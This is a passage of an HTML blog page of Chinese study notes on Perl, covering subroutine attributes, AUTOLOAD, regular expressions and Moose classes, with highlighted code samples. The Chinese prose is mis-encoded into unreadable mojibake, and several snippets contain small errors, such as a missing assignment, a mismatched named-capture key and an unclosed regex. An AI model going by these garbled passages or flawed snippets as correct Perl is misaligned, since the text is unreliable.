äºå˜é‡æˆ–å‡½æ•°å£°æ˜ä¸Šçš„ <mark>å‰ç½®å†’å·æ ‡è¯†ç¬¦</mark> . å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $fortress      :hidden;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">erupt_volcano</span> :<span class="hljs-title">ScienceProject</span> </span>&#123; ... &#125;<br></code></pre></td></tr></table></figure><p>å±æ€§ <mark>å¯ä»¥åŒ…æ‹¬ä¸€ä¸ªå‚æ•°åˆ—è¡¨</mark> , Perl å°†å®ƒä»¬ä½œä¸ºä¸€ä¸ªå¸¸é‡å­—ç¬¦ä¸²åˆ—è¡¨.</p><h3 id="å±æ€§çš„ç¼ºç‚¹"><a href="#å±æ€§çš„ç¼ºç‚¹" class="headerlink" title="å±æ€§çš„ç¼ºç‚¹"></a>å±æ€§çš„ç¼ºç‚¹</h3><p>è§ä¹¦.</p><h2 id="AUTOLOAD"><a href="#AUTOLOAD" class="headerlink" title="AUTOLOAD"></a>AUTOLOAD</h2><p>è°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°æ˜¯å°±ä¼šå¯»æ‰¾è¿™ä¸ªå‡½æ•°å¹¶è°ƒç”¨.</p><h3 id="AUTOLOAD-çš„åŸºæœ¬åŠŸèƒ½"><a href="#AUTOLOAD-çš„åŸºæœ¬åŠŸèƒ½" class="headerlink" title="AUTOLOAD çš„åŸºæœ¬åŠŸèƒ½"></a>AUTOLOAD çš„åŸºæœ¬åŠŸèƒ½</h3><p><code>AUTOLOAD()</code> å‡½æ•°ç›´æ¥åœ¨ <code>@_</code> ä¸­æ¥åˆ°ä¼ é€’ç»™æœªå®šä¹‰å‡½æ•°çš„å‚æ•°.</p><p>æœªå®šä¹‰å‡½æ•°çš„åç§°å¯ä»¥ä»ä¼ªå…¨å±€å˜é‡ <code>$AUTOLOAD</code> å¾—åˆ°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">AUTOLOAD</span> </span>&#123;<br>    <span class="hljs-keyword">our</span> $AUTOLOAD;<br><br>    <span class="hljs-keyword">local</span> $&quot; = <span class="hljs-string">&#x27;, &#x27;</span>;<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;In AUTOLOAD(@_) for $AUTOLOAD&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªå¸¸è§ç”¨äºå¯ä»¥ç”¨æ¥å»æ‰åŒ…å:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">AUTOLOAD</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> ($name) = <span class="hljs-keyword">our</span> $AUTOLOAD =~ <span class="hljs-regexp">/::(\w+)$/</span>;<br><br>    <span class="hljs-keyword">local</span> $&quot; = <span class="hljs-string">&#x27;, &#x27;</span>;<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;In AUTOLOAD(@_) for $name&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åœ¨-AUTOLOAD-ä¸­é‡åˆ†æ´¾æ–¹æ³•"><a href="#åœ¨-AUTOLOAD-ä¸­é‡åˆ†æ´¾æ–¹æ³•" class="headerlink" title="åœ¨ AUTOLOAD() ä¸­é‡åˆ†æ´¾æ–¹æ³•"></a>åœ¨ AUTOLOAD() ä¸­é‡åˆ†æ´¾æ–¹æ³•</h3><p>è§ä¹¦</p><h1 id="æ­£åˆ™è¡¨è¾¾å¼å’ŒåŒ¹é…"><a href="#æ­£åˆ™è¡¨è¾¾å¼å’ŒåŒ¹é…" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼å’ŒåŒ¹é…"></a>æ­£åˆ™è¡¨è¾¾å¼å’ŒåŒ¹é…</h1><p>å¯å‚è€ƒæ–‡æ¡£:</p><ul><li><code>perldoc perlretut</code> æ•™ç¨‹</li><li><code>perldoc perlre</code> å®Œæ•´æ–‡æ¡£</li><li><code>perldoc perlreref</code> å‚è€ƒæŒ‡å—</li></ul><p>æ­£åˆ™è¡¨è¾¾å¼ç»‘å®šæ“ä½œç¬¦ <code>=~</code> æ˜¯ä¸€ä¸ªä¸­ç¼€æ“ä½œç¬¦, å®ƒå°†ä½äºå…¶å³çš„æ­£åˆ™è¡¨è¾¾å¼åº”ç”¨äºå·¦è¾¹ç”±è¡¨è¾¾å¼äº§ç”Ÿçš„å­—ç¬¦ä¸², å½“åœ¨æ ‡é‡ä¸Šä¸‹æ–‡ä¸­æ±‚å€¼æ—¶, <mark>ä¸€ä¸ªæˆåŠŸçš„åŒ¹é…å°†å¾—åˆ°çœŸå€¼</mark>.</p><h2 id="qr-æ“ä½œç¬¦å’Œæ­£åˆ™è¡¨è¾¾å¼ç»„åˆ"><a href="#qr-æ“ä½œç¬¦å’Œæ­£åˆ™è¡¨è¾¾å¼ç»„åˆ" class="headerlink" title="qr// æ“ä½œç¬¦å’Œæ­£åˆ™è¡¨è¾¾å¼ç»„åˆ"></a><code>qr//</code> æ“ä½œç¬¦å’Œæ­£åˆ™è¡¨è¾¾å¼ç»„åˆ</h2><p>åˆ›å»ºæ­£åˆ™è¡¨è¾¾å¼, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $hat = <span class="hljs-regexp">qr/hat/</span>;<br><span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Found a hat!&#x27;</span> <span class="hljs-keyword">if</span> $name =~ <span class="hljs-regexp">/$hat/</span>;<br></code></pre></td></tr></table></figure><p><code>Test::More</code> çš„ <code>like()</code> å‡½æ•°å’Œ <code>is()</code> ç±»ä¼¼, åªæ˜¯ç¬¬äºŒä¸ªå‚æ•°æ˜¯ <code>qr//</code> äº§ç”Ÿçš„æ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">like($name, <span class="hljs-regexp">qr/$hat$filed/</span>, <span class="hljs-string">&#x27;Found a hat in a field&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="é‡è¯"><a href="#é‡è¯" class="headerlink" title="é‡è¯"></a>é‡è¯</h2><p><code>&#123;n&#125;</code> æ„å‘³ç€ç¡®åˆ‡åŒ¹é… n æ¬¡.</p><h2 id="è´ªå¿ƒæ€§"><a href="#è´ªå¿ƒæ€§" class="headerlink" title="è´ªå¿ƒæ€§"></a>è´ªå¿ƒæ€§</h2><p><code>*</code> å’Œ <code>+</code> æ˜¯è´ªå¿ƒé‡è¯. </p><p>è®©è´ªå¿ƒé‡è¯å˜æˆéè´ªå¿ƒåªéœ€åœ¨å…¶ååŠ ä¸Š <code>?</code> é‡è¯.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $minimal_greedy_match = <span class="hljs-regexp">qr/hot.*?meal/</span>;<br></code></pre></td></tr></table></figure><h2 id="æ­£åˆ™è¡¨è¾¾å¼é”šç‚¹"><a href="#æ­£åˆ™è¡¨è¾¾å¼é”šç‚¹" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼é”šç‚¹"></a>æ­£åˆ™è¡¨è¾¾å¼é”šç‚¹</h2><p>é”šç‚¹çš„æ„æ€æ˜¯, å¼ºåˆ¶åœ¨å­—ç¬¦ä¸²æŸä½ç½®è¿›è¡ŒåŒ¹é….</p><p><code>\A</code> ç¡®ä¿ä»»ä½•åŒ¹é…éƒ½å°†ä»å­—ç¬¦ä¸²å¼€å¤´å¼€å§‹.</p><p><code>\Z</code> ç¡®ä¿ä»»ä½•åŒ¹é…éƒ½å°†ç»“æŸäºå­—ç¬¦ä¸²æœ«å°¾.</p><p>(ä¸ºä»€ä¹ˆæ˜¯ <code>\A</code> å’Œ <code>\Z</code>, å› ä¸ºè¿™æ˜¯å­—æ¯è¡¨çš„é¦–å°¾)</p><p>å•è¯è¾¹ç•Œå…ƒå­—ç¬¦ <code>\b</code>.</p><h2 id="å…ƒå­—ç¬¦"><a href="#å…ƒå­—ç¬¦" class="headerlink" title="å…ƒå­—ç¬¦"></a>å…ƒå­—ç¬¦</h2><p>åŒ¹é…å­—ç¬¦, æ•°å­—, ç©ºç™½: <code>\w</code>, <code>\d</code>, <code>\s</code></p><h2 id="å­—ç¬¦ç±»"><a href="#å­—ç¬¦ç±»" class="headerlink" title="å­—ç¬¦ç±»"></a>å­—ç¬¦ç±»</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $maybe_cat = <span class="hljs-regexp">qr/c$&#123;vowels&#125;t/</span>;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>&#123;&#125;</code> æœ‰åŠ©äºæ¶ˆé™¤å¯¹å˜é‡åçš„æ­§ä¹‰.</p><p>å°†è¿å­—ç¬¦æ·»åŠ åˆ°å­—ç¬¦ç±»çš„å¼€å¤´æˆ–ç»“å°¾å¯ä»¥å°†å…¶åŒ…æ‹¬è¿›æ­¤å­—ç¬¦ç±»ä¸­ (æˆ–è½¬ä¹‰):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $interesting_punctuation = <span class="hljs-regexp">qr/-!?/</span>;<br></code></pre></td></tr></table></figure><p>ç”¨ <code>^</code> ä½œä¸ºå­—ç¬¦ç±»çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ„å‘³ç€ â€œé™¤è¿™äº›å¤–çš„æ‰€æœ‰å­—ç¬¦â€.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $not_a_vowel = <span class="hljs-regexp">qr/[^aeiou]/</span>;<br></code></pre></td></tr></table></figure><h2 id="æ•è·"><a href="#æ•è·" class="headerlink" title="æ•è·"></a>æ•è·</h2><h3 id="å…·åæ•è·"><a href="#å…·åæ•è·" class="headerlink" title="å…·åæ•è·"></a>å…·åæ•è·</h3><p>ç»“æ„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">(?&lt;capture name&gt; ...)<br></code></pre></td></tr></table></figure><p>(è¿™é‡Œçš„ <code>()</code> å’Œ <code>&lt;&gt;</code> éƒ½æ˜¯æœ‰çš„, <code>...</code> è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼çš„å†…å®¹)</p><p>å¦‚æœæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…è¯¥ç‰‡æ®µ, Perl å°†å­—ç¬¦ä¸²è¢«æ•è·éƒ¨åˆ†å­˜å‚¨åœ¨ç¥å¥‡å˜é‡ <code>%+</code> ä¸­: ä¸€ä¸ªä»¥æ•è·ç¼“å†²åŒºåä¸ºé”®, åŒ¹é…è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²éƒ¨åˆ†ä¸ºå€¼çš„å“ˆå¸Œ.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> ($contact_info =~ /(?&lt;phone&gt;$phone_number)) &#123;<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Found a number $+&#123;number&#125;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç¼–å·æ•è·"><a href="#ç¼–å·æ•è·" class="headerlink" title="ç¼–å·æ•è·"></a>ç¼–å·æ•è·</h3><p>Perl å°†æ•è·çš„å­å­—ç¬¦ä¸²æ”¾åœ¨ä¸€ç³»åˆ—ä»¥ <code>$1</code> å¼€å¤´çš„ç¥å¥‡å˜é‡ä¸­.</p><p>æ•è·è®¡æ•°èµ·å§‹äºæ•è·çš„å¼€æ‹¬å·.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> ($contact_info =~ <span class="hljs-regexp">/($phone_number)/</span>) &#123;<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Found a number $1&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æˆç»„æˆ–é€‰é¡¹"><a href="#æˆç»„æˆ–é€‰é¡¹" class="headerlink" title="æˆç»„æˆ–é€‰é¡¹"></a>æˆç»„æˆ–é€‰é¡¹</h3><p><mark>éæ•è·åˆ†ç»„</mark>, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $starches = <span class="hljs-regexp">qr/(?:pasta|potatoes|rice)/</span>;<br></code></pre></td></tr></table></figure><h2 id="å…¶ä»–è½¬ä¹‰åºåˆ—"><a href="#å…¶ä»–è½¬ä¹‰åºåˆ—" class="headerlink" title="å…¶ä»–è½¬ä¹‰åºåˆ—"></a>å…¶ä»–è½¬ä¹‰åºåˆ—</h2><p><code>\Q</code> å…ƒå­—ç¬¦ <mark>ç¦ç”¨å¯¹å…ƒå­—ç¬¦çš„å¤„ç†</mark> çŸ¥é“å®ƒç¢°åˆ° <code>\E</code> åºåˆ—.</p><h2 id="æ–­è¨€"><a href="#æ–­è¨€" class="headerlink" title="æ–­è¨€"></a>æ–­è¨€</h2><p><mark>æ­£åˆ™è¡¨è¾¾å¼çš„æ–­è¨€å½¢å¼</mark> , æŒ‡å­—ç¬¦ä¸²éœ€è¦æ»¡è¶³æ­¤æ¡ä»¶, ä½†å¹¶ä¸å®é™…åŒ¹é…å­—ç¬¦ä¸²ä¸­çš„æŸä¸ªå­—ç¬¦.</p><p>å¦‚æ­£åˆ™è¡¨è¾¾å¼é”šç‚¹ <code>\A</code>, <code>\Z</code>. <code>\b</code> å’Œ <code>\B</code> ä¹Ÿæ˜¯æ–­è¨€.</p><p>è¿˜æœ‰äº›è§ä¹¦.</p><h2 id="æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦"><a href="#æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦"></a>æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦</h2><p>å¯åœ¨æ¨¡å¼ä¸­å†…åµŒä¿®é¥°ç¬¦, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $find_a_cat = <span class="hljs-regexp">qr/(?&lt;feline&gt;(?i)cat)/</span>;<br></code></pre></td></tr></table></figure><p><code>(?i)</code> è¯­æ³•ä»…ä¸ºå®ƒæ‰€åŒ…å›´çš„ç»„å¯ç”¨å¤§å°å†™ä¸æ•æ„ŸåŒ¹é….</p><p>ä¹Ÿå¯ä»¥é€šè¿‡å‰ç¼€ <code>-</code> æ¥ç¦ç”¨ç‰¹å®šçš„ä¿®é¥°ç¬¦. å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $find_a_cat = <span class="hljs-regexp">qr/(?&lt;feline&gt;(?-i)cat)/</span>;<br></code></pre></td></tr></table></figure><p>å…¶ä»–è§ä¹¦.</p><h2 id="æ™ºèƒ½åŒ¹é…"><a href="#æ™ºèƒ½åŒ¹é…" class="headerlink" title="æ™ºèƒ½åŒ¹é…"></a>æ™ºèƒ½åŒ¹é…</h2><p>æ™ºèƒ½åŒ¹é…æ“ä½œç¬¦ <code>~~</code>.</p><p>å…·ä½“è§ä¹¦.</p><h1 id="å¯¹è±¡"><a href="#å¯¹è±¡" class="headerlink" title="å¯¹è±¡"></a>å¯¹è±¡</h1><h2 id="Moose"><a href="#Moose" class="headerlink" title="Moose"></a>Moose</h2><p>Moose æ˜¯ä¸€ä¸ªä¸“ä¸º Perl 5 æä¾›æ›´ä¸ºå®Œæ•´çš„å¯¹è±¡ç³»ç»Ÿ.</p><p>é¢å‘å¯¹è±¡,æˆ– é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡,æ˜¯ä¸€ç§ç¨‹åºç¼–æ’æ–¹æ³•,å®ƒå°†ç»„ä»¶åˆ†å—ä¸ºç¦»æ•£çš„å”¯ä¸€ çš„å®ä½“ã€‚è¿™äº›å®ä½“ç§°ä¸º å¯¹è±¡ã€‚ç”¨ Moose çš„æœ¯è¯­æ¥è¯´,æ¯ä¸€ä¸ªå¯¹è±¡æ˜¯æŸä¸€ä¸ª ç±» çš„å®ä¾‹, ç±»ä½œä¸ºæ¨¡ç‰ˆæè¿°äº†å¯¹è±¡åŒ…å«çš„æ•°æ®å’Œä¸“å±çš„è¡Œä¸ºã€‚</p><h3 id="ç±»"><a href="#ç±»" class="headerlink" title="ç±»"></a>ç±»</h3><p>ç±»å¯ä»¥æœ‰ä¸€ä¸ªåç§°, é»˜è®¤åœ°, Perl 5 ç±»ä½¿ç”¨åŒ…æ¥æä¾›åç§°ç©ºé—´:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-keyword">package</span> Cat;<br><br>    <span class="hljs-keyword">use</span> Moose;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ Moose ä¼šå®šä¹‰æ­¤ç±»å¹¶å‘ Perl æ³¨å†Œå®ƒ.</p><p>ä¹‹åå°±å¯ä»¥åˆ›å»º <code>Cat</code> ç±»çš„å¯¹è±¡ (æˆ–å®ä¾‹):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $brad = Cat-&gt;new();<br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h3><p>method å°±æ˜¯ä¸€ä¸ªå’Œç±»å…³è”çš„å‡½æ•°.</p><p>æ–¹æ³•è°ƒç”¨æ€»æ˜¯å¯¹æ‰§è¡Œæ–¹æ³• <mark>è¢«è°ƒç”¨è€…</mark> è¿›è¡Œçš„. Perl 5 ä¸­æ–¹æ³•çš„è¢«è°ƒç”¨è€…æ˜¯æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°, å¦‚, <code>Cat</code> ç±»å¯ä»¥æ‹¥æœ‰ä¸€ä¸ªåä¸º <code>meow()</code> (å–µ) çš„æ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-keyword">package</span> Cat;<br><br>    <span class="hljs-keyword">use</span> Moose;<br><br>    <span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">meow</span> </span>&#123;<br>        <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>        <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Meow!&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $alarm = Cat-&gt;new();<br>$alarm-&gt;meow();<br></code></pre></td></tr></table></figure><p>æŒ‰ç…§æƒ¯ä¾‹, Perl ä¸­æ–¹æ³•çš„è¢«è°ƒç”¨è€…æ˜¯ä¸€ä¸ªåä¸º <code>$self</code> çš„è¯æ³•å˜é‡, ä½†è¿™ä»…ä»…æ˜¯ä¸€ä¸ªæ™®éçš„æƒ¯ä¾‹.</p><p>ä¹Ÿå°±æ˜¯è¯´, ä¼šå°†è°ƒç”¨è€…ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥.</p><h3 id="å±æ€§-1"><a href="#å±æ€§-1" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><p>å¯¹è±¡å¯ä»¥åŒ…å«å±æ€§, æˆ–è€…è¯´å’Œæ¯ä¸€ä¸ªå¯¹è±¡å…³è”çš„ç§æœ‰æ•°æ® (å®ä¾‹æ•°æ®æˆ–çŠ¶æ€).</p><p>è¦å®šä¹‰å¯¹è±¡å±æ€§, å¯ä»¥å°†ä»–ä»¬æè¿°ä¸ºç±»çš„ä¸€éƒ¨åˆ†:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-keyword">package</span> Cat;<br><br>    <span class="hljs-keyword">use</span> Moose;<br><br>    has <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Str&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™è¡Œä»£ç çš„å«ä¹‰ä¸º â€œCat å¯¹è±¡æœ‰ä¸€ä¸ª name å±æ€§, å®ƒå¯è¯»ä½†ä¸å¯å†™, å¹¶ä¸”å®ƒæ˜¯å­—ç¬¦ä¸²â€, è¯¥è¡Œä»£ç è¿˜åˆ›å»ºäº†ä¸€ä¸ªè®¿é—®å™¨æ–¹æ³• (<code>name()</code>) ä¸”å…è®¸ä½ å¯ä»¥å‘æ„é€ å‡½æ•°ä¼ é€’ä¸€ä¸ª <code>name</code> å‚æ•°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Cat;<br><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">my</span> $name (<span class="hljs-string">qw( Tuxie Petunia Daisy )</span>) &#123;<br>    <span class="hljs-keyword">my</span> $cat = Cat-&gt;new(<span class="hljs-string">name =&gt;</span> $name);<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Created a cat for &quot;</span>, $cat-&gt;name();<br>&#125;<br></code></pre></td></tr></table></figure><p><mark>å±æ€§çš„ç±»å‹å¹¶éå¿…é¡»</mark> .</p><p>Moose çš„æ–‡æ¡£ä½¿ç”¨æ‹¬å·æ¥åˆ†éš”å±æ€§åç§°å’Œå®ƒçš„ç‰¹å¾:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">has <span class="hljs-string">&#x27;name&#x27;</span> =&gt; ( <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;no&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Str&#x27;</span>);<br></code></pre></td></tr></table></figure><p>åŠ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">has <span class="hljs-string">&#x27;name&#x27;</span> =&gt; (<br>    <span class="hljs-string">is  =&gt;</span> <span class="hljs-string">&#x27;no&#x27;</span>,<br>    <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Str&#x27;</span>,<br>)<br></code></pre></td></tr></table></figure><p>è‹¥å±æ€§ <mark>æ ‡è®°ä¸ºå¯è¯»å¯å†™ <code>is =&gt; rw</code></mark> , Moose å°†åˆ›å»ºä¸€ä¸ªçªå˜æ–¹æ³•, å³å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•æ¥æ”¹å˜å±æ€§çš„å€¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-keyword">package</span> Cat;<br><br>    <span class="hljs-keyword">use</span> Moose;<br><br>    has <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Str&#x27;</span>;<br>    has <span class="hljs-string">&#x27;age&#x27;</span> , <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Int&#x27;</span>;<br>    has <span class="hljs-string">&#x27;diet&#x27;</span>, <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;rw&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">my</span> $fat = Cat-&gt;new( <span class="hljs-string">name =&gt;</span> <span class="hljs-string">&#x27;Fatty&#x27;</span>, <span class="hljs-string">age =&gt;</span> <span class="hljs-number">8</span>, <span class="hljs-string">diet =&gt;</span> <span class="hljs-string">&#x27;Sea Treats&#x27;</span> );<br><br>$fat-&gt;diet( <span class="hljs-string">&#x27;Low Sodium Kitty Lo Mein&#x27;</span> );<br><span class="hljs-keyword">say</span> $fat-&gt;name(), <span class="hljs-string">&#x27; now eats &#x27;</span>, $fat-&gt;diet();<br><br></code></pre></td></tr></table></figure><h3 id="å°è£…"><a href="#å°è£…" class="headerlink" title="å°è£…"></a>å°è£…</h3><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Cat;<br><br><span class="hljs-keyword">use</span> Moose;<br><br>has <span class="hljs-string">&#x27;name&#x27;</span>,         <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Str&#x27;</span>;<br>has <span class="hljs-string">&#x27;dirt&#x27;</span>,         <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;rw&#x27;</span>; <br>has <span class="hljs-string">&#x27;birth_year&#x27;</span>,   <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Int&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">age</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">my</span> $year (<span class="hljs-keyword">localtime</span>)[<span class="hljs-number">5</span>] + <span class="hljs-number">1900</span>;<br><br>    <span class="hljs-keyword">return</span> $year - $self-&gt;birth_year();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéšè—äº† <code>birth_year</code> è¿™ä¸ªå±æ€§.</p><p>å¯ä»¥ä½¿ç”¨ <mark>é»˜è®¤å±æ€§</mark> :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Cat;<br><br><span class="hljs-keyword">use</span> Moose;<br><br>has <span class="hljs-string">&#x27;name&#x27;</span>,         <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Str&#x27;</span>;<br>has <span class="hljs-string">&#x27;dirt&#x27;</span>,         <span class="hljs-string">is =&gt;</span> <span 